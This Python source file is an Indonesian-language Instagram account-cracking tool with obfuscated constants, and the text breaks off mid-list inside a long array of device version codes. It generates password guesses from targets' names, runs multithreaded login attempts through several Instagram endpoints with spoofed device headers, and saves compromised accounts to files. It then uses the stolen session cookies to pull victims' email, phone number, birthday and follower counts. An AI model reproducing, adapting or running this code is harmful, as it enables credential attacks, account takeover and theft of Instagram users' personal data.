#!/usr/bin/env python
_Ax = '"success":true'
_Aw = '{"clientID":"(.*?)"}'
_Av = "INSTAGRAM"
_Au = "account_type"
_At = "account_id"
_As = "client_mutation_id"
_Ar = "https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point"
_Aq = "PolarisPostCommentsContainerQuery"
_Ap = '"__spin_t":(\\d+)'
_Ao = '"__spin_r":(\\d+)'
_An = '"DTSGInitialData",\\[\\],{"token":"(.*?)"}'
_Am = '"hsi":"(\\d+)"'
_Al = '"haste_session":"(.*?)"'
_Ak = '{"actorID":"(\\d+)"'
_Aj = "server_timestamps"
_Ai = "__comet_req"
_Ah = "https://i.instagram.com/challenge"
_Ag = "redirection_to_checkpoint"
_Af = "params=%s&bk_client_context=%s&bloks_versioning_id=%s"
_Ae = '","styles_id":"instagram"}'
_Ad = '{"bloks_version":"'
_Ac = '","machine_id":"'
_Ab = "sec-fetch-site"
_Aa = "id-ID, en-US"
_AZ = "x-fb-server-cluster"
_AY = "x-fb-client-ip"
_AX = "x-fb-http-engine"
_AW = "x-ig-capabilities"
_AV = "x-bloks-is-layout-rtl"
_AU = "x-ig-mapped-locale"
_AT = "x-ig-device-locale"
_AS = "x-ig-app-locale"
_AR = "936619743392459"
_AQ = "www.instagram.com"
_AP = "x-asbd-id"
_AO = "1217981644879628"
_AN = "RelayModern"
_AM = "fb_api_caller_class"
_AL = "__req"
_AK = "https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/"
_AJ = "x-pigeon-session-id"
_AI = "false"
_AH = "accept-language"
_AG = "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"
_AF = "https://accountscenter.instagram.com/api/graphql/"
_AE = "device_id_fetch_ig_did"
_AD = "device_id"
_AC = "variables"
_AB = "accountscenter.instagram.com"
_AA = "x-fb-lsd"
_A9 = "android-%s"
_A8 = "data/CP-Instagram-%s.txt"
_A7 = "data/OK-Instagram-%s.txt"
_A6 = "A2F Tidak Aktif"
_A5 = "A2F Di Aktifkan"
_A4 = "sessionid"
_A3 = "ds_user_id"
_A2 = '"sessionid":"(.*?)"'
_A1 = '{"ds_user_id":"(\\d+)"'
_A0 = '"headers":"{"IG-Set-Authorization": "(.*?)"'
_z = "logged_in_user"
_y = "bloks_versioning_id"
_x = "bk_client_context"
_w = "params"
_v = "{}"
_u = "x-mid"
_t = "data"
_s = "True"
_r = "567067343352427"
_q = "in_ID"
_p = "accept"
_o = "03"
_n = "Kode Pemulihan Tidak Ada"
_m = "x-fb-friendly-name"
_l = '"LSD",\\[\\],{"token":"(.*?)"'
_k = "doc_id"
_j = "fb_api_req_friendly_name"
_i = "{:.3f}"
_h = "x-ig-timezone-offset"
_g = "x-ig-bandwidth-totaltime-ms"
_f = "x-ig-bandwidth-totalbytes-b"
_e = "x-ig-bandwidth-speed-kbps"
_d = "x-pigeon-rawclienttime"
_c = "application/x-www-form-urlencoded"
_b = "04"
_a = "02"
_Z = "01"
_Y = "content-type"
_X = "content-length"
_W = "Host"
_V = "SecretKey"
_U = "x-ig-device-id"
_T = "0"
_S = " "
_R = "a"
_Q = "12345"
_P = "success-a2f"
_O = ":"
_N = "x-ig-family-device-id"
_M = "2"
_L = "1"
_K = "x-bloks-version-id"
_J = "cookie"
_I = "x-ig-app-id"
_H = False
_G = "kode-pemulihan"
_F = "\\"
_E = "x-ig-android-id"
_D = "utf-8"
_C = "user-agent"
_B = None
_A = True
import re, os, uuid, sys, requests, datetime, hashlib, urllib, pytz, zlib, time, json, random, base64, string
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bsp
from rich import print as Print
from rich.panel import Panel as Nel
from rich.console import Console
from rich.tree import Tree

P = "\x1b[97m"
I = "\x1b[30m"
A = "\x1b[90m"
H = "\x1b[32m"
K2 = "\x1b[33m"
M = K2
K = H
datetim = datetime.datetime.now()
file_ok = "%s-%s-%s" % (datetim.day, datetim.month, datetim.year)
KamuNya = b"x\x9c\xcb())(\xb6\xd2\xd7/H,.I\xd5+I\xd6/J,\xd7\xcf)(\xc8\xd651335\x06\x00\xb4|\n\x82"
temane = []


class MAIN:
    (
        id,
        Loop,
        MethodType,
        ResultSuccess,
        ResultChechpoint,
        UbahData,
        info,
        proxi,
        GerryDev,
        MID,
        PROXY,
        CrackDuplikat,
        bugbaru,
    ) = ([], 0, [], 0, 0, [], {}, [], {}, [], {"Update": _B, "proxi": []}, [], [])

    def __init__(A):
        A.head = {_C: _AG}

    def MyRich(A, Text, chos=_B):
        if os.path.isfile("cat_rich.py") is _A:
            import cat_rich as B

            A.cat = B.Lylii
        else:
            A.cat = "color(8)"
        if A.cat not in temane:
            temane.append(A.cat)
        if chos:
            Console(width=62).print(Nel(Text, subtitle="┌─", subtitle_align="left", style=A.cat))
        else:
            Console(width=62).print(Nel(Text, style=A.cat))

    def List(A, uid):
        for B in uid:
            A.id.append(B)
        A.MyRich("[white]01. Threads  02. Manual 03. Recovery 04. SmartLock", _A)
        A.Main()

    def Main(A):
        while _A:
            B = Console(style=temane[0]).input("   └──> ")
            if B in [_Z, _L]:
                A.MethodType.append(_L)
            elif B in [_a, _M]:
                A.MethodType.append(_M)
            elif B in [_o, "3"]:
                A.MethodType.append("3")
            elif B in [_b, "4"]:
                A.MethodType.append("4")
            break
        A.Exekusy()

    def Exekusy(A):
        A.MyRich("ketikan [green]t", _A)
        B = Console(style=temane[0]).input(f"   └──> ")
        if B in ["ya", "y"]:
            A.UbahData.append(_A)
        else:
            A.UbahData.append(_H)
        A.Exekusy2()

    def pwdc(A, nama, full, komb):
        F = "123456"
        E = nama
        D = "1234"
        C = "123"
        B = komb
        A.x, A.i = [], []
        for A.y in E.split(_S):
            if len(A.y) < 2:
                continue
            elif len(A.y) == 3 or len(A.y) == 4 or len(A.y) == 5:
                A.z = A.y.lower()
                if B == _L or B == _Z:
                    A.x.append(A.z + C)
                    A.x.append(A.z + D)
                    A.x.append(A.z + _Q)
                elif B == _M or B == _a:
                    A.x.append(A.z + C)
                    A.x.append(A.z + D)
                    A.x.append(A.z + _Q)
                    A.x.append(A.z + F)
                else:
                    A.x.append(A.z + C)
                    A.x.append(A.z + D)
                    A.x.append(A.z + _Q)
            else:
                A.z = A.y.lower()
                if B == _L or B == _Z:
                    A.x.append(A.z + C)
                    A.x.append(A.z + D)
                    A.x.append(A.z + _Q)
                    A.x.append(A.z)
                elif B == _M or B == _a:
                    A.x.append(A.z + C)
                    A.x.append(A.z + D)
                    A.x.append(A.z + _Q)
                    A.x.append(A.z + F)
                    A.x.append(A.z)
                else:
                    A.x.append(A.z + C)
                    A.x.append(A.z + D)
                    A.x.append(A.z + _Q)
                    A.x.append(A.z)
            if len(E) < 5:
                0
            else:
                A.x.append(E.replace(_S, "").lower())
                A.x.append(E.lower())
            if B == "3" or B == _o:
                A.l = full.replace("_", _S).replace(".", _S).replace("__", _S)
                if len(A.l) < 3:
                    continue
                else:
                    try:
                        A.b = A.l.split(_S)
                        for A.r in A.b:
                            if len(A.r) < 3:
                                continue
                            elif len(A.r) < 5:
                                A.x.append(A.r.lower() + C)
                                A.x.append(A.r.lower() + D)
                                A.x.append(A.r.lower() + _Q)
                                A.x.append(A.r.lower() + "11")
                                A.x.append(A.r.lower() + "14")
                                A.x.append(A.r.lower() + "15")
                                A.x.append(A.r.lower() + "16")
                                A.x.append(A.r.lower() + "17")
                                A.x.append(A.r.lower() + "18")
                                A.x.append(A.r.lower() + _Z)
                                A.x.append(A.r.lower() + _a)
                                A.x.append(A.r.lower() + _o)
                                A.x.append(A.r.lower() + _b)
                                A.x.append(A.r.lower() + "05")
                                A.x.append(A.r.lower() + "06")
                                A.x.append(A.r.lower() + "07")
                                A.x.append(A.r.lower() + "08")
                                A.x.append(A.r.lower() + "09")
                            else:
                                A.x.append(A.r.lower() + "23")
                                A.x.append(A.r.lower() + "24")
                                A.x.append(A.r.lower() + "25")
                                A.x.append(A.r.lower() + "26")
                                A.x.append(A.r.lower() + "27")
                                A.x.append(A.r.lower() + "28")
                                A.x.append(A.r.lower() + "29")
                                A.x.append(A.r.lower() + "30")
                                A.x.append(A.r.lower() + "31")
                                A.x.append(A.r.lower() + "32")
                                A.x.append(A.r.lower() + "33")
                                A.x.append(A.r.lower() + "34")
                                A.x.append(A.r.lower() + "35")
                                A.x.append(A.r.lower() + "36")
                                A.x.append(A.r.lower() + "37")
                                A.x.append(A.r.lower() + "38")
                                A.x.append(A.r.lower())
                    except:
                        pass
        for A.d in A.x:
            if A.d not in A.i:
                if len(A.d) <= 5:
                    0
                else:
                    A.i.append(A.d)
        return A.i

    def cek_key(A, OS=_B):
        B = "data/.keys.txt"
        try:
            if os.path.isfile(B) is _A:
                A.key = open(B, "r").read()
                A.xyz = requests.get("https://paste.tc/raw/licensu-64").text
                A.pok = re.findall(A.key + ".*", A.xyz)[0]
            elif not OS:
                exit()
            else:
                0
        except IndexError:
            if OS == _A:
                0
            else:
                exit("\nLicensi not found!")

    def Exekusy2(A):
        A.KeyCek = A.cek_key(_A)
        A.MyRich(
            "[white]01. Sandi 1-5  03. Sandi Username 1-9\n02. Sandi 1-6  04. Sandi + Manual", _A
        )
        C = Console(style=temane[0]).input(f"   └──> ")
        if C not in [_L, _Z, _M, _a, "3", _o, "4", _b]:
            print(f"\n{P}[{K2}!{P}] {K2}Pilihan Tidak Tersedia")
            A.Exekusy2()
        elif C in ["4", _b]:
            F = []
            A.MyRich("[white]Gunakan Koma Untuk Pemisahan, Pastikan sandi harus 6/Lebih!", _A)
            G = Console(style=temane[0]).input(f"   └──> ").split(",")
            for A.tambah in G:
                if len(A.tambah) <= 5:
                    0
                else:
                    F.append(A.tambah)
        A.MyRich("Sedang Menjalankan Tols")
        A.mayb = A.OverPower()
        with ThreadPoolExecutor(max_workers=35) as E:
            for I in A.id:
                try:
                    D, J = I.split("|")
                    B = A.pwdc(J, D, C)
                    if C == "4" or C == _b:
                        B = B + F
                    else:
                        B = B
                    if _L in A.MethodType:
                        E.submit(A.ApiThreads, D, B)
                    elif _M in A.MethodType:
                        E.submit(A.Api, D, B)
                    elif "3" in A.MethodType:
                        E.submit(A.ApiRecovery, D, B)
                    else:
                        E.submit(A.SmartLockGoogle, D, B)
                except:
                    pass
        if A.ResultSuccess != 0 or A.ResultChechpoint != 0:
            A.total = A.ResultSuccess + A.ResultChechpoint
            print(
                f"""

{P} Crack Selesai

 Anda Mendapatkan {A.total} akun
 Akun OK : {H}{A.ResultSuccess}{P}
 Akun CP : {K2}{A.ResultChechpoint}{P}

 Terima Kasih Telah Menggunakan Tools Ini
 \t- {H}Gerry {P}-"""
            )
            exit(0)
        else:
            print(
                f"\n\n{P} Crack Selesai\n{K2} Ups Anda Tidak Mendapatkan Hasil Kali Ini\n{K2} Silahkan Ganti Target Dan Pastikan Tidak Menggunakan Wifi"
            )
            exit(1)

    def Fafo(A, cokie):
        D = "Requests Error!"
        C = "fbAccount"
        B = cokie
        try:
            A.c = re.findall("csrftoken=(.*?);", str(B))
            A.x = {
                _W: _AQ,
                _X: _T,
                "x-requested-with": "XMLHttpRequest",
                "x-csrftoken": "tJdFh5wJTuFDQZvpadl2kTm0LGRSkH8w" if len(A.c) == 0 else A.c[0],
                _I: _AR,
                "x-instagram-ajax": "1011212827",
                _C: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                _Y: _c,
                _p: "*/*",
                _AP: "129477",
                _J: B,
            }
            A.r = requests.post(
                "https://www.instagram.com/api/v1/web/fxcal/ig_sso_users/", headers=A.x
            ).json()
            if C in str(A.r):
                A.nama = A.r[C]["display_name"]
                A.Reqz = requests.get(
                    "https://accountscenter.instagram.com/profiles/", cookies={_J: B}
                ).text
                A.User = re.search(
                    '{"__typename":"XFBFXFBAccountInfo","id":"(.*?)"}', str(A.Reqz)
                ).group(1)
            else:
                A.nama = _B
                A.User = _B
        except:
            A.nama = D
            A.User = D
        A.aku = "%s%s|%s" % (H, A.User, A.nama)
        return A.aku

    def Android_ID(A, users, passwd):
        A.xyz = hashlib.md5()
        A.xyz.update(users.encode(_D) + passwd.encode(_D))
        A.hex = A.xyz.hexdigest()
        A.xyz.update(A.hex.encode(_D) + _Q.encode(_D))
        return A.xyz

    def friends_user(N, cookies):
        B = cookies
        try:
            C = {
                _AS: _q,
                _AT: _q,
                _AU: "id_ID",
                _K: "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
                _AV: _AI,
                _AW: "3brTv10=",
                _I: _r,
                "priority": "u=3",
                _C: "Instagram 275.0.0.27.98 Android (25/7.1.2; 240dpi; 720x1280; Google/google; google Pixel 2; x86; android_x86; in_ID; 458229257)",
                _AH: _Aa,
                _AX: "Liger",
                _AY: _s,
                _AZ: _s,
            }
            E = {"edit": "true"}
            A = requests.get(
                "https://i.instagram.com/api/v1/accounts/current_user/",
                params=E,
                headers=C,
                cookies={_J: B},
            ).json()["user"]
            F = A["email"]
            G = A["full_name"]
            H = A["username"]
            I = A["phone_number"]
            J = A["pk_id"]
            K = A["birthday"]
            D = requests.get(
                f"https://i.instagram.com/api/v1/users/{J}/info/", headers=C, cookies={_J: B}
            ).json()["user"]
            L = D["follower_count"]
            M = D["following_count"]
            return F, G, H, I, K, L, M
        except:
            return

    def friends_user_chek(C, username):
        B = "count"
        try:
            C.head.update(
                {
                    _W: _AQ,
                    "cache-control": "max-age=0",
                    "upgrade-insecure-requests": _L,
                    _p: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    _Ab: "none",
                }
            )
            A = requests.get(
                f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}",
                headers=C.head,
            ).json()[_t]["user"]
            D, E, F = (
                A["edge_followed_by"][B],
                A["edge_follow"][B],
                A["edge_owner_to_timeline_media"][B],
            )
            return D, E, F
        except:
            return _B, _B, _B

    def Convert(B, dict_c):
        A = ";".join(["%s=%s" % (A, B) for (A, B) in dict_c.items()])
        return A

    def AppUac(A, GoblokLu=_B):
        A.Dpi = random.choice(
            [
                "320dpi",
                "640dpi",
                "213dpi",
                "480dpi",
                "420dpi",
                "240dpi",
                "280dpi",
                "160dpi",
                "560dpi",
                "540dpi",
                "272dpi",
                "360dpi",
                "720dpi",
                "270dpi",
                "450dpi",
                "600dpi",
                "279dpi",
                "210dpi",
                "180dpi",
                "510dpi",
                "300dpi",
                "454dpi",
                "314dpi",
                "288dpi",
                "401dpi",
                "153dpi",
                "267dpi",
                "345dpi",
                "493dpi",
                "340dpi",
                "604dpi",
                "465dpi",
                "680dpi",
                "256dpi",
                "290dpi",
                "432dpi",
                "273dpi",
                "120dpi",
                "200dpi",
                "367dpi",
                "419dpi",
                "306dpi",
                "303dpi",
                "411dpi",
                "195dpi",
                "518dpi",
                "230dpi",
                "384dpi",
                "315dpi",
                "293dpi",
                "274dpi",
                "235dpi",
            ]
        )
        A.Ppxl = random.choice(
            [
                "720x1280",
                "1440x2560",
                "1440x2768",
                "1280x720",
                "1280x800",
                "1080x1920",
                "540x960",
                "1080x2076",
                "1080x2094",
                "1080x2220",
                "480x800",
                "768x1024",
                "1440x2792",
                "1200x1920",
                "720x1384",
                "1920x1080",
                "720x1369",
                "800x1280",
                "720x1440",
                "1080x2058",
                "600x1024",
                "720x1396",
                "2792x1440",
                "1920x1200",
                "2560x1440",
                "1536x2048",
                "720x1382",
                "1080x2113",
                "1080x2198",
                "1080x2131",
                "720x1423",
                "1080x2069",
                "720x1481",
                "1080x2047",
                "1080x2110",
                "1080x2181",
                "1080x2209",
                "1080x2180",
                "1080x2020",
                "1080x2095",
                "1440x2723",
                "1080x2175",
                "720x1365",
                "1440x2699",
                "1080x2218",
                "2699x1440",
                "1440x2907",
                "1080x2257",
                "720x1370",
                "1080x2042",
                "720x1372",
                "1080x2200",
                "1080x2186",
                "720x1361",
                "1080x2024",
                "1080x2006",
                "720x1402",
                "1440x2831",
                "720x1454",
                "1080x2064",
                "1440x2933",
                "720x1411",
                "720x1450",
                "1440x2730",
                "1080x2046",
                "2094x1080",
                "540x888",
                "1440x2759",
                "1080x2274",
                "1080x2178",
                "1440x2706",
                "720x1356",
                "720x1466",
                "1440x2900",
                "2560x1600",
                "1080x2038",
                "1600x2452",
                "1080x2129",
                "720x1422",
                "720x1381",
                "1080x2183",
                "1080x2285",
                "800x1216",
                "1080x2216",
                "1080x2168",
                "1080x2119",
                "1080x2128",
                "1080x2273",
                "2274x1080",
                "1080x2162",
                "1080x2164",
                "2076x1080",
                "1024x768",
                "1080x2173",
                "1440x2845",
                "1080x2134",
                "720x1379",
                "1440x2838",
                "1080x2139",
                "2131x1080",
                "1440x2744",
                "1080x2192",
                "720x1406",
                "1440x2960",
                "1080x2029",
                "2042x1080",
                "1080x2212",
                "1406x720",
                "1080x2288",
                "2047x1080",
                "1080x2051",
                "720x1398",
                "1280x736",
                "1382x720",
                "720x1353",
                "1080x2050",
                "1080x2028",
                "1080x2256",
                "2711x1440",
                "2175x1080",
                "1080x2281",
                "2560x1492",
                "1440x2923",
                "1200x1845",
                "1080x2189",
                "1080x2002",
                "1440x2711",
                "2110x1080",
                "960x540",
                "1080x2033",
                "2200x1080",
                "720x1452",
                "720x1480",
                "1440x2735",
                "720x1472",
                "1080x2277",
                "1080x2169",
                "2874x1440",
                "1600x2560",
                "1080x2151",
                "2218x1080",
                "1080x2182",
                "720x1468",
                "1440x2898",
                "1080x2011",
                "1080x2201",
                "720x1380",
                "1080x2287",
                "2069x1080",
                "1200x1836",
                "2046x1080",
                "720x1439",
                "2058x1080",
                "2182x1080",
                "720x1399",
                "1080x2282",
                "1440x2721",
                "1080x2324",
                "720x1432",
                "1080x2165",
                "1080x2150",
                "1080x2156",
                "1080x1872",
                "1440x3048",
                "1532x2560",
                "720x1355",
                "720x1390",
                "720x1476",
                "720x1410",
                "1080x2032",
                "720x1437",
                "1440x2682",
                "1440x2921",
                "1080x2270",
                "1080x2160",
                "720x1446",
                "1200x1848",
                "1440x2874",
                "1080x2309",
                "1080x2174",
                "1440x2867",
                "1080x2060",
                "1080x2196",
                "1080x2401",
                "1536x1922",
                "1080x2280",
                "1080x2123",
                "720x1435",
                "1440x2927",
                "1080x2276",
                "720x1448",
                "720x1469",
                "720x1344",
                "1080x2187",
                "540x937",
                "1440x3028",
                "1080x2184",
                "1440x2718",
                "1080x2326",
                "840x1834",
                "1440x2935",
                "1440x2880",
                "1440x2892",
                "2048x2048",
                "1080x2195",
                "1080x2322",
                "720x1419",
                "987x1450",
                "1080x2092",
                "1440x3047",
                "720x1358",
                "1080x2136",
                "720x1357",
                "1080x2093",
                "720x1477",
                "1080x2312",
                "1080x2361",
                "720x1341",
                "720x1507",
                "1080x2172",
                "720x1337",
                "1080x2177",
                "1080x2125",
                "1440x2891",
                "1600x2434",
                "720x1394",
                "1080x2159",
                "720x1387",
                "1080x2166",
                "1080x2154",
                "1080x2147",
                "1440x2747",
                "1080x2105",
                "1440x2911",
                "720x1473",
                "1080x2055",
                "1080x2265",
                "720x1436",
                "1080x2190",
                "1600x2526",
                "720x1373",
                "720x1415",
                "1080x2249",
                "1080x2254",
                "720x1455",
                "1440x3040",
                "1080x2149",
                "720x1385",
                "1440x3036",
                "1080x2111",
                "1440x2904",
                "720x1442",
                "720x1377",
                "1080x2307",
                "1080x2327",
                "1080x2141",
                "1080x2025",
                "720x1430",
                "720x1375",
                "1080x2283",
                "1440x2779",
                "1080x2321",
                "1080x2268",
                "1440x2758",
                "1752x2698",
                "1080x2267",
                "1200x1856",
                "1440x2756",
                "720x1464",
                "1080x2234",
                "1080x2171",
                "1080x2155",
                "720x1463",
                "1080x2122",
                "720x1467",
                "1080x2264",
                "720x1349",
                "1440x2999",
                "720x1458",
                "1080x2015",
                "720x1431",
                "1242x2208",
                "1080x2185",
                "1080x2148",
                "1080x2163",
                "1440x2780",
                "720x1445",
                "1080x2146",
                "1200x1916",
                "720x1502",
                "1200x1928",
                "720x1506",
                "720x1424",
                "720x1465",
                "720x1420",
                "1080x2176",
                "720x1521",
                "1080x2315",
                "1080x2400",
                "720x1471",
                "1080x2157",
                "1600x2458",
                "1080x2067",
                "1080x2191",
                "1080x2271",
                "720x1407",
                "800x1208",
                "1080x2087",
                "1080x2199",
                "578x1028",
                "720x1485",
                "540x879",
                "1080x2179",
                "720x1555",
                "810x1598",
                "720x1378",
                "1200x1897",
                "720x1395",
                "720x1459",
                "900x1600",
                "1080x2275",
                "1440x2733",
            ]
        )
        A.kode = random.choice(
            [
                "104766893",
                "104766900",
                "102221278",
                "104766888",
                "105842053",
                "93117670",
                "94080607",
                "96794592",
                "102221279",
                "100986894",
                "ru_RU",
                "94080606",
                "103516660",
                "98288242",
                "103516666",
                "103516653",
                "uk_UA",
                "96794590",
                "100986893",
                "102221277",
                "95414344",
                "99640920",
                "99640911",
                "96794591",
                "ru_UA",
                "99640905",
                "100986890",
                "107092313",
                "99640900",
                "93117667",
                "100521966",
                "90841939",
                "98288239",
                "89867440",
                "105842051",
                "de_DE",
                "96794584",
                "105842050",
                "en_US",
                "pt_PT",
                "109556223",
                "107092318",
                "en_GB",
                "108357722",
                "112021130",
                "107092322",
                "119104798",
                "108357720",
                "119104802",
                "112021131",
                "100986892",
                "113249569",
                "107104231",
                "fr_FR",
                "pt_BR",
                "109556226",
                "116756948",
                "113249553",
                "113249561",
                "110937441",
                "118342010",
                "120662545",
                "117539703",
                "119875222",
                "110937448",
                "121451799",
                "115994877",
                "108357718",
                "120662547",
                "107608058",
                "122206624",
                "95414346",
                "107092308",
                "112021128",
                "90841948",
                "119875229",
                "117539698",
                "120662550",
                "en_NZ",
                "123103748",
                "91882538",
                "121451810",
                "91882537",
                "118342006",
                "113948109",
                "122338251",
                "110937453",
                "es_US",
                "118342005",
                "121451793",
                "109556219",
                "119875225",
                "en_CA",
                "109556220",
                "117539695",
                "115211358",
                "91882539",
                "119104795",
                "89867442",
                "94080603",
                "164094539",
                "175574628",
                "185203690",
                "188791648",
                "188791674",
                "187682694",
                "188791643",
                "177770724",
                "192992577",
                "180322810",
                "195435560",
                "196643820",
                "196643821",
                "188791637",
                "192992576",
                "196643799",
                "196643801",
                "196643803",
                "195435546",
                "194383411",
                "197825254",
                "197825260",
                "197825079",
                "171727793",
                "197825112",
                "197825012",
                "197825234",
                "179155086",
                "192992563",
                "197825268",
                "166149669",
                "192992565",
                "198036424",
                "197825223",
                "183982969",
                "199325909",
                "199325886",
                "199325890",
                "199325911",
                "197825118",
                "127049003",
                "197825169",
                "197825216",
                "197825127",
                "200395960",
                "179155096",
                "199325907",
                "200396014",
                "188791669",
                "197825133",
                "170693926",
                "200396005",
                "171727780",
                "201577064",
                "201576758",
                "201577192",
                "201775949",
                "201576944",
                "201775970",
                "143631574",
                "126223520",
                "201775951",
                "167338518",
                "144612598",
                "170693940",
                "201775813",
                "200395971",
                "201775744",
                "201775946",
                "202766609",
                "145652094",
                "202766591",
                "202766602",
                "203083142",
                "179155088",
                "202766608",
                "199325884",
                "180322802",
                "202766603",
                "195435547",
                "165030894",
                "201576967",
                "201775904",
                "194383424",
                "197347903",
                "202766610",
                "185203693",
                "201576898",
                "204019468",
                "187682682",
                "204019456",
                "201775901",
                "204019471",
                "204019454",
                "204019458",
                "202766601",
                "204019452",
                "173238721",
                "204019466",
                "148324036",
                "202766581",
                "158441904",
                "201576903",
                "205280538",
                "205280529",
                "201576813",
                "173238729",
                "141753096",
                "205280531",
                "163022072",
                "201576887",
                "163022088",
                "141753091",
                "148324051",
                "205280528",
                "154400383",
                "205280537",
                "201576818",
                "157405371",
                "205858383",
                "201576811",
                "165031093",
                "187682684",
                "145652090",
                "206670917",
                "185203686",
                "192992561",
                "183982986",
                "206670927",
                "150338061",
                "183982962",
                "127049016",
                "175574603",
                "155374054",
                "205858247",
                "135374896",
                "206670920",
                "169474958",
                "206670926",
                "160497905",
                "161478672",
                "192992578",
                "206670929",
                "131223243",
                "206670916",
                "142841919",
                "187682681",
                "171727795",
                "151414277",
                "206670922",
                "160497915",
                "207505137",
                "165030898",
                "208061741",
                "208061688",
                "208180365",
                "208061674",
                "197825052",
                "147375133",
                "208061744",
                "196643798",
                "208061725",
                "122338247",
                "157536430",
                "208061728",
                "209143963",
                "208727155",
                "209143726",
                "205280539",
                "209143903",
                "209143970",
                "181496409",
                "208061739",
                "209143957",
                "210180522",
                "210180512",
                "209143881",
                "209143712",
                "180322805",
                "210180521",
                "195435561",
                "210370119",
                "210180523",
                "210180493",
                "175574596",
                "210180510",
                "210180480",
                "210180513",
                "210180517",
                "176649504",
                "177770663",
                "210180479",
                "211114117",
                "210908379",
                "206670921",
                "211114134",
                "183982943",
                "211399345",
                "211399342",
                "211399332",
                "201775962",
                "211574187",
                "211574249",
                "210180519",
                "167338559",
                "185203649",
                "124583960",
                "211399337",
                "211399335",
                "197825163",
                "166149717",
                "211399336",
                "212063371",
                "211399329",
                "209143954",
                "210180482",
                "168361634",
                "212214017",
                "209143867",
                "211399341",
                "211399340",
                "212214027",
                "195435510",
                "122338243",
                "139237670",
                "152367502",
                "212676872",
                "212676898",
                "212676875",
                "212676895",
                "212676901",
                "209823384",
                "212676869",
                "196643822",
                "212676878",
                "213367980",
                "213368005",
                "212676886",
                "213558743",
                "209143913",
                "212214039",
                "158441917",
                "174081672",
                "213558750",
                "201775966",
                "188791681",
                "185203705",
                "143631575",
                "161478664",
                "214245350",
                "161478663",
                "212676881",
                "213558770",
                "214245346",
                "138226752",
                "214245221",
                "214245182",
                "214245206",
                "214245218",
                "214245354",
                "214245295",
                "214245199",
                "214245304",
                "214245280",
                "214446313",
                "214245187",
                "214245288",
                "214139002",
                "202766605",
                "214245319",
                "214646783",
                "158441914",
                "215246048",
                "195435544",
                "208061677",
                "215464400",
                "128676146",
                "215464389",
                "215464385",
                "215464390",
                "215464398",
                "182747397",
                "215464393",
                "216233197",
                "201775791",
                "216817344",
                "215464395",
                "216817286",
                "185203642",
                "164094529",
                "216817305",
                "215464401",
                "162439029",
                "215464382",
                "216817280",
                "216817331",
                "214330969",
                "216817299",
                "216817357",
                "217948981",
                "217948980",
                "217948956",
                "217948959",
                "217948968",
                "216817296",
                "217948952",
                "217948982",
                "216817269",
                "219308759",
                "219308726",
                "182747387",
                "219308721",
                "219308754",
                "219308763",
                "176649435",
                "183982982",
                "219909486",
                "127049038",
                "219308730",
                "221134012",
                "221134032",
                "221134009",
                "221134037",
                "194383426",
                "221134029",
                "221134005",
                "221134018",
                "145652093",
                "225283632",
                "165031108",
                "225283625",
                "224652582",
                "139906580",
                "225283628",
                "225283624",
                "226142579",
                "225283634",
                "225283631",
                "226493211",
                "225283623",
                "185203672",
                "156514151",
                "218793478",
                "225283621",
                "227299063",
                "225283627",
                "227299064",
                "227299021",
                "227299027",
                "227544546",
                "227299041",
                "227299060",
                "227299012",
                "228970707",
                "228970705",
                "227299005",
                "228970687",
                "228970683",
                "228970694",
                "228970710",
                "228970689",
                "160497904",
                "195435540",
                "129611419",
                "229783842",
                "230291708",
                "228970681",
                "148324047",
                "230877709",
                "231192211",
                "230877674",
                "230877705",
                "230877678",
                "211399328",
                "209143896",
                "230877713",
                "194383428",
                "230877689",
                "221134002",
                "231457747",
                "208061721",
                "230877671",
                "230877668",
                "232868027",
                "232088496",
                "185203706",
                "232868005",
                "232867964",
                "232868001",
                "232868015",
                "232868031",
                "232867959",
                "232868009",
                "164094526",
                "232867941",
                "234041364",
                "182747399",
                "232868024",
                "232867949",
                "234847239",
                "234847238",
                "234847234",
                "162439040",
                "234847229",
                "234847230",
                "181496427",
                "234847240",
                "232867993",
                "195435558",
                "232867967",
                "232867997",
                "234847227",
                "235871830",
                "221133998",
                "236572344",
                "236572377",
                "153386780",
                "236572337",
                "236572349",
                "236572372",
                "234847226",
                "236572383",
                "237507050",
                "238093993",
                "238093948",
                "238093954",
                "238093999",
                "238093982",
                "239490565",
                "239490555",
                "238093946",
                "238093966",
                "239490563",
                "239490550",
                "239974660",
                "240726416",
                "239490568",
                "240726484",
                "240726452",
                "239490551",
                "239490548",
                "240726426",
                "240726476",
                "240726491",
                "240726471",
                "241043882",
                "241114613",
                "236572331",
                "241267273",
                "240726407",
                "241456456",
                "241267278",
                "241267269",
                "241114619",
                "241456445",
                "241456451",
                "242168941",
                "242168928",
                "242168931",
                "242168939",
                "242168925",
                "240726436",
                "242375239",
                "144722090",
                "242168935",
                "242290370",
                "157405369",
                "242168933",
                "242290355",
                "242703240",
                "242807362",
                "242168923",
                "242168943",
                "242991209",
                "243646252",
                "243646269",
                "242991200",
                "243711120",
                "243646267",
                "243711093",
                "243975802",
                "243646263",
                "243646248",
                "243646255",
                "244167578",
                "128676156",
                "194383413",
                "243975835",
                "244390417",
                "244390338",
                "245196084",
                "245196061",
                "240726392",
                "245196055",
                "243646273",
                "245196082",
                "245196063",
                "245196070",
                "245666450",
                "245466705",
                "245870319",
                "245870301",
                "245870347",
                "245196087",
                "246889064",
                "246889072",
                "246889073",
                "246889074",
                "246889065",
                "247146500",
                "246889063",
                "245870262",
                "247370962",
                "247146481",
                "246889068",
                "246889062",
                "247541884",
                "247541831",
                "247370955",
                "247370942",
                "247720736",
                "247720751",
                "248310216",
                "248310220",
                "248310208",
                "247720744",
                "248399342",
                "248310210",
                "247720747",
                "248310206",
                "248717751",
                "248310212",
                "248310221",
                "248823392",
                "248583561",
                "248310205",
                "248899028",
